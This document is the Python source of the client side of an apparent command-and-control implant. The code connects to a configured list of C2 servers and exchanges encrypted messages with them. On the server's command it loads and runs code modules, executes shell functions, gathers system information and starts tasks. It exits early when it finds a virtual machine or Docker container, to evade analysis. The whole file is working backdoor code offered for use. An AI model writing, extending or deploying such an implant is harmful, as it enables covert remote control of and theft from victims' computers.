import sys
import json
import time
import queue
import paker
import socket
import struct
import logging
import threading

from infos import *
from config import *

from utils import Logger, decrypt, encrypt, MessageEncoder, MessageDecoder, ClientHandler

HOST = '127.0.0.1'
PORT = 8192


class Client:
    def __init__(self):
        super(Client, self).__init__()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.key = C2_ENCRYPTION_KEY
        self.socket = None
        self.importer = None
        self.verified = False
        self.threads = []
        self.log_handler = ClientHandler(self)

        self.message_que = queue.Queue()

        self.active = threading.Event()
        self.passive = threading.Event()

        self.tasks = []
        self.tasks_que = []

    def run(self):
        while not self.active.is_set():
            for c2 in C2_HOSTS:
                address, port = c2.get("ip"), c2.get("port")
                try:
                    self.socket = socket.create_connection((address, port))
                    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.active.set()
                    logging.getLogger().addHandler(self.log_handler)
                    self.logger.debug("Connected successfully to: {}".format(self.socket.getpeername()))
                    self.read()

                except (socket.timeout, socket.error):
                    self.logger.debug("Unable to connect to {}:{}. Retrying in {} seconds...".format(address,
                                                                                                     port,
                                                                                                     C2_TIMEOUT))
                    time.sleep(C2_TIMEOUT)

                except Exception as e:
                    self.logger.error("Socket error while connecting to server: {}".format(str(e)))
                    try:
                        self.socket.close()
                    except socket.error:
                        pass
                    self.active.clear()
                    # start from first C2 host
                    break

    def write(self, data):
        """Send data to C2 server."""
        try:
            if not self.verified:
                self.message_que.put(data)
            data = json.dumps(data, cls=MessageEncoder).encode()
            if self.key:
                data = encrypt(data, self.key)
            data = struct.pack('!L', len(data)) + data
        except Exception as e:
            self.logger.warning("Failed to serialize dict: {}".format(e))
        self.socket.sendall(data)
        # self.logger.debug("Sent data to {}: {}".format(self.socket.getpeername(), data))

    def read(self):
        """Wait for data and process it."""
        while self.active.is_set():
            header_size = struct.calcsize('!L')
            try:
                header = self.socket.recv(header_size)
            except Exception as e:
                self.logger.warning("Socket error while reading data: {}".format(e))
                header = ""

            if len(header) == 4:
                msg_size = struct.unpack('!L', header)[0]
                data = self.socket.recv(msg_size)
                if self.key:
                    data = decrypt(data, self.key)
                data = data.decode()
                try:
                    self.process_message(json.loads(data, cls=MessageDecoder))
                except json.JSONDecodeError as e:
                    self.logger.warning("Failed to decode message {}: {}".format(data, e))
                except Exception as e:
                    self.logger.error("Failed to process message {}: {}".format(data, e))
            else:
                logging.getLogger().removeHandler(self.log_handler)
                self.logger.info("Disconnected from server")
                self.key = C2_ENCRYPTION_KEY
                self.active.clear()
                self.verified = False
            time.sleep(0.5)

    def process_message(self, data: dict):
        event_type = data.get("event_type")
        event = data.get("event")

        if event_type == "assign":
            key = data.get("encryption_key")
            self.write(data)
            self.key = key
            self.verified = True
            while not self.message_que.empty():
                self.write(self.message_que.get())

        elif event_type == "module":
            if event == "load":
                try:
                    self.importer = paker.loads(data.get("code", {}), overwrite=data.get("overwrite", False))
                    self.write({"event_type": "module", "event": "loaded", "module": data.get("name")})
                except Exception as e:
                    self.write({"event_type": "module", "event": "error", "module": data.get("name"), "error": str(e)})

            elif event == "get":
                modules = []
                if self.importer is not None:
                    for module in self.importer.jsonmod:
                        if module not in modules:
                            modules.append(str(module))
                self.write({"event_type": "module", "event": "get", "module": modules})

            elif event == "unload_module":
                if self.importer is not None:
                    module = data.get("name")
                    self.importer.unload_module(module)
                    self.write({"event_type": "module", "event": "unloaded_module", "module": module})

            elif event == "unload":
                if self.importer is not None:
                    self.importer.unload()
                    self.importer = None
                    self.write({"event_type": "module", "event": "unloaded"})

        elif event_type == "shell":
            command = data.get("command")
            resp = {"event_type": "shell", "event": "output"}
            try:
                import shell
                command = str(command)
                resp["output"] = getattr(shell, command)(*data.get("args"))
                resp["exit_code"] = 0

            except AttributeError:
                resp["output"] = "Command not found"
                resp["exit_code"] = 2

            except Exception as e:
                resp["output"] = "Failed to execute command {}: {}".format(command, e)
                resp["exit_code"] = 1
            self.write(resp)

        elif event_type == "info":
            # execute utility with matching name
            info_list = data.get("info")
            if type(info_list) is list:
                resp = {"event_type": "info", "info": data.get("info"), "results": {}}
                for info in info_list:
                    self.logger.info("Running utility {}/{}: {}".format(info_list.index(info) + 1,
                                                                        len(info_list), info))
                    try:
                        resp["results"][info] = {}
                        resp["results"][info]["result"] = globals()[info]()
                        resp["results"][info]["exit_code"] = 0

                    except KeyError as e:
                        self.logger.error(
                            "Utility {} not imported or does not exist".format(info))
                        resp["results"][info]["result"] = "KeyError: {}".format(str(e))
                        resp["results"][info]["exit_code"] = 1

                    except Exception as e:
                        self.logger.error(
                            "Error while processing utility {}: {}".format(info, e))
                        resp["results"][info]["result"] = "Exception: {}".format(str(e))
                        resp["results"][info]["exit_code"] = 1

                self.write(resp)

        elif event_type == "task":
            # process task
            task = data.get("task")
            task_id = data.get("task_id")
            kwargs = data.get("kwargs")
            user_activity = data.get("user_activity")
            if event == "start":
                if task not in [running_task.__class__.__name__ for running_task in self.tasks]:
                    try:
                        task_obj = getattr(sys.modules[__name__], task)(task_id)
                        task_obj.user_activity = user_activity
                        task_obj.set_run_kwargs(kwargs)
                        if not user_activity:
                            thr = task_obj.start(kwargs)
                            task_obj.set_thread(thr)
                            self.write({"event_type": "task", "task": task, "task_id": task_id, "state": "started"})
                            self.tasks.append(task_obj)
                        else:
                            self.logger.info("Created user activity based task {}:{}".format(
                                task_obj.id, task_obj.__class__.__name__))
                            self.write({"event_type": "task", "task": task, "task_id": task_id, "state": "queued"})
                            self.tasks_que.append(task_obj)

                    except Exception as e:
                        self.logger.error("Failed to start task {}: {}".format(task_id, e))
                        self.write({"event_type": "task", "task": task, "task_id": task_id,
                                    "state": "finished", "result": str(e), "exit_code": 1})
            elif event == "get":
                for task in self.tasks:
                    running = task.serialize()
                    self.write(running)
            elif event == "stop":
                self.stop_task(task_id)
            elif event == "force_start":
                self.force_start_task(task_id)

        else:
            self.logger.error("Failed to find matching event type for message: {}".format(data))

    def stop_task(self, task_id):
        for task in self.tasks_que:
            if task.id == task_id:
                self.tasks_que.remove(task)
                self.tasks.append(task)
                self.logger.info("Task {} removed from queue".format(task.id))
                return

        for task in self.tasks:
            if task.id == task_id:
                self.logger.debug("Trying to stop task {}".format(task.id))
                task.stop()
                self.logger.info("Stopping task {}...".format(task.id))
                return

    def force_start_task(self, task_id):
        for task in self.tasks_que:
            if task.id == task_id:
                self.tasks_que.remove(task)
                thr = task.start(task.run_kwargs)
                task.set_thread(thr)
                self.tasks.append(task)
                self.write({"event_type": "task", "task": task.__class__.__name__,
                            "task_id": task_id, "state": "started"})
                self.logger.info("Task {} force started".format(task.id))
                return

    def check_for_finished_tasks(self):
        for task in self.tasks:
            if not task.is_alive():
                result = task.join(0)
                if result is not None:
                    task.set_finished(result.get("result"), result.get("exit_code"))
                    self.write(task.serialize())
                    self.tasks.remove(task)

    def close(self):
        for task in self.tasks:
            task.join()
        try:
            self.socket.close()
        except Exception as e:
            self.logger.error(e)
        sys.exit(0)



if __name__ == '__main__':
    try:
        if (not ALLOW_VM and is_running_in_vm()) or (not ALLOW_DOCKER and is_running_in_docker()):
            sys.exit(0)
    except Exception:
        if not ALLOW_IF_VM_CHECK_FAILS:
            sys.exit(0)

    if STARTUP_DELAY:
        time.sleep(STARTUP_DELAY)

    log = Logger()
    log.enable()
    c = Client()
    c.run()
